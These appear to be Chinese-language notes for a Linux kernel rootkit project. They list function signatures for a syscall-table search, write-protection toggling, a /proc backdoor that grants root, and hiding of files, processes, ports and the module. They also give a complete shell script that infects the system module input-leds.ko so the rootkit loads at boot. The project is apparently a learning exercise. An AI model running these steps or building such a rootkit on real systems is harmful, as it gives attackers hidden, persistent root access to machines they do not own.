[TOC]

## 解释rootkit.c中功能对应的函数 & authme.sh两部分

基本参考网址：

https://www.freebuf.com/sectool/105713.html：搜索系统调用表&关闭/开启内存写保护

https://www.freebuf.com/articles/system/107829.html：后门、文件隐藏、进程隐藏、端口隐藏、模块隐藏

https://www.freebuf.com/articles/system/109034.html：感染系统模块实现自启

1、搜索系统调用表sys_call_table：暴力搜索：

```c
unsigned long *find(void)
```

2、关闭/开启内存写保护：

```c
void disable_wp(void)
void enable_wp(void)
```

3、后门：

```c
#define NAME "PROMOTION"
#define AUTH "AUTHME"
struct proc_dir_entry *entry;
ssize_t write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);
struct file_operations proc_fops = {
    .write = write_handler
};
```

authme.sh前一半测试，通过id和对file文件的读取权限的改变

```shell
# can not read /proc/kcore
id && file /proc/kcore
# now we can
printf '%s' try_promotion > /proc/PROMOTION && \
	printf '%s' AUTHME > /proc/PROMOTION && \
	id && \
	file /proc/kcore
```

4、文件隐藏：

```c
int fake_iterate(struct file *filp, struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
```

5、进程隐藏：

```c
int fake_iterate_ps(struct file *filp, struct dir_context *ctx);       
int fake_filldir_ps(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
```

6、端口隐藏：

```c
int fake_seq_show(struct seq_file *seq, void *v);
```

7、模块隐藏：

```c
int fake_iterate_md(struct file *filp, struct dir_context *ctx);
int fake_filldir_md(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);
int fake_seq_show_md(struct seq_file *seq, void *v);
```

8、模块感染系统模块input-leds.ko实现自启，在authme.sh后一半实现（见下），其中setsym是使用一个博主自己编写的工具，详见第二部分

```sh
# auto start by linking to the sys's input-leds.ko module
# cp the target module to current workdir & check the init and exit func
cp /lib/modules/$(uname -r)/kernel/drivers/input/input-leds.ko .
readelf -s input-leds.ko | grep -e grep -e input_leds_init -e input_leds_exit

# set the init and exit func to global & check if objcopy succeed
objcopy input-leds.ko inputleds.ko --globalize-symbol input_leds_init --globalize-symbol input_leds_exit
readelf -s inputleds.ko | grep -e grep -e input_leds_init -e input_leds_exit

# link the target module and malicous module together
ld -r inputleds.ko rootkit.ko -o infected.ko

# change the host's init_module/cleanup_module ->  rk_init/rk_exit, using a tool named 'setsym'
setsym infected.ko init_module $(setsym infected.ko rk_init)
setsym infected.ko cleanup_module $(setsym infected.ko rk_exit)

# rmmod the origin target module & insmod the linked one
rmmod input-leds.ko
insmod infected.ko
```



## 自启中使用的setsym工具

在使用前输入指令:

```shell
make
sudo make install
```



## ELSE:

Q: win上传文件会自动修改换行方式为当前系统

A: 可以修改git全局配置，禁止git自动将lf转换成crlf,  命令：

​	git config --global core.autocrlf false